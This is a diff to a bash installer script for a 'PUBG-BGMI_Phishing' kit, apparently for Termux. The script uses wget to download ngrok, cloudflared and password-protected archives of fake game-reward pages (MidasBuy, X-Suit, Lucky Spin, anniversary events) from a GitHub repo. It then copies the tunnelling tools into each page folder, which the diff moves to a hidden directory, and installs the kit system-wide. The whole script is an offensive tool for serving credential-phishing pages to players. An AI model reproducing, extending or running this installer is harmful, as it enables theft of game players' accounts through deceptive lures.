@@ -6,12 +6,29 @@ echo ""
 logo() {
 echo -e ""
 echo -e "\e[33m
-  ██████╗ ██╗   ██╗██████╗  ██████╗       ██████╗  ██████╗ ███╗   ███╗██╗
-  ██╔══██╗██║   ██║██╔══██╗██╔════╝       ██╔══██╗██╔════╝ ████╗ ████║██║
-  ██████╔╝██║   ██║██████╔╝██║  ███╗█████╗██████╔╝██║  ███╗██╔████╔██║██║
-  ██╔═══╝ ██║   ██║██╔══██╗██║   ██║╚════╝██╔══██╗██║   ██║██║╚██╔╝██║██║
-  ██║     ╚██████╔╝██████╔╝╚██████╔╝      ██████╔╝╚██████╔╝██║ ╚═╝ ██║██║
-  ╚═╝      ╚═════╝ ╚═════╝  ╚═════╝       ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝ \e[0m\n"
+
+ ██▓███   █    ██  ▄▄▄▄     ▄████ 
+▓██░  ██▒ ██  ▓██▒▓█████▄  ██▒ ▀█▒
+▓██░ ██▓▒▓██  ▒██░▒██▒ ▄██▒██░▄▄▄░
+▒██▄█▓▒ ▒▓▓█  ░██░▒██░█▀  ░▓█  ██▓
+▒██▒ ░  ░▒▒█████▓ ░▓█  ▀█▓░▒▓███▀▒
+▒▓▒░ ░  ░░▒▓▒ ▒ ▒ ░▒▓███▀▒ ░▒   ▒ 
+░▒ ░     ░░▒░ ░ ░ ▒░▒   ░   ░   ░ 
+░░        ░░░ ░ ░  ░    ░ ░ ░   ░ 
+            ░      ░            ░ 
+                        ░         
+ ▄▄▄▄     ▄████  ███▄ ▄███▓ ██▓   
+▓█████▄  ██▒ ▀█▒▓██▒▀█▀ ██▒▓██▒   
+▒██▒ ▄██▒██░▄▄▄░▓██    ▓██░▒██▒   
+▒██░█▀  ░▓█  ██▓▒██    ▒██ ░██░   
+░▓█  ▀█▓░▒▓███▀▒▒██▒   ░██▒░██░   
+░▒▓███▀▒ ░▒   ▒ ░ ▒░   ░  ░░▓     
+▒░▒   ░   ░   ░ ░  ░      ░ ▒ ░   
+ ░    ░ ░ ░   ░ ░      ░    ▒ ░   
+ ░            ░        ░    ░     
+      ░                           
+
+  \e[0m\n"
 }
 
 logo2() {
@@ -48,7 +65,7 @@ echo ""
 
 
 download() {
-echo -e "\e[92m
+echo "\e[92m
   _____                      _                 _ 
  |  __ \                    | |               | |
  | |  | | _____      ___ __ | | ___   __ _  __| |
@@ -174,10 +191,11 @@ echo""
 download
 echo ""
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
-echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         Download Link Services         !!\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;93m  !!         Download Link Services         !!\e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
 echo ""
 wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/Ngrok/Ngrok%20Old/ngrok -O ngrok
+echo ""
 wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared-linux-arm64
 echo""
 clear
@@ -187,10 +205,12 @@ echo ""
 download
 echo ""
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
-echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!          DOWNLOAD TOOL FILE          !!\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;96m  !!          DOWNLOAD TOOL FILE          !!\e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
 echo ""
+rm -rf .SUMAN
 wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/PUBG-BGMI/SM/newsite/SUMAN-PUBG.rar -O SUMAN-PUBG.rar
+echo ""
 wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/PUBG-BGMI/SM/newsite/SUMAN-BGMI.rar -O SUMAN-BGMI.rar
 unrar x -Password SUMAN-PUBG.rar
 unrar x -Password SUMAN-BGMI.rar
@@ -232,16 +252,17 @@ exit
 fi
 
 echo
-cp -R cloudflared-linux-arm64 ngrok SUMAN/X-Suit/
-cp -R cloudflared-linux-arm64 ngrok SUMAN/Avalanche-X-Suit-LuckySpin/
-cp -R cloudflared-linux-arm64 ngrok SUMAN/MidasBuy/
-cp -R cloudflared-linux-arm64 ngrok SUMAN/RP-Month-6-event/
-cp -R cloudflared-linux-arm64 ngrok SUMAN/Collect-Car-event/
-cp -R cloudflared-linux-arm64 ngrok SUMAN1/Collect-MC-Larent-Car/
-cp -R cloudflared-linux-arm64 ngrok SUMAN1/SPIN-EVENT/
-cp -R cloudflared-linux-arm64 ngrok SUMAN1/Collect-EVENT-LINE/
-cp -R cloudflared-linux-arm64 ngrok SUMAN1/Lucky-Spin-Godzila-S19/
-cp -R cloudflared-linux-arm64 ngrok SUMAN1/Godzilla-LuckySpin/
+cp -R cloudflared-linux-arm64 ngrok .SUMAN/X-Suit/
+cp -R cloudflared-linux-arm64 ngrok .SUMAN/Avalanche-X-Suit-LuckySpin/
+cp -R cloudflared-linux-arm64 ngrok .SUMAN/MidasBuy/
+cp -R cloudflared-linux-arm64 ngrok .SUMAN/SPIN-EVENT/
+cp -R cloudflared-linux-arm64 ngrok .SUMAN/RP-Month-6-event/
+
+cp -R cloudflared-linux-arm64 ngrok .SUMAN/BGMI_4_Anniversarry/
+cp -R cloudflared-linux-arm64 ngrok .SUMAN/PUBG-4-Anniversarry/
+cp -R cloudflared-linux-arm64 ngrok .SUMAN/PUBG-RP-M9/
+cp -R cloudflared-linux-arm64 ngrok .SUMAN/BGMI-Collect-M416/
+cp -R cloudflared-linux-arm64 ngrok .SUMAN/BGMI-Car-Event/
 chmod 7777 PUBG-BGMI_Phishing
 clear
 echo
@@ -255,7 +276,6 @@ cp -R PUBG-BGMI_Phishing /data/data/com.termux/files/usr/bin
 cp -R OnlineHacking /data/data/com.termux/files/usr/bin
 cp -R links /data/data/com.termux/files/usr/bin
 echo
-rm -rf .SUMAN
 echo
 logo
 echo
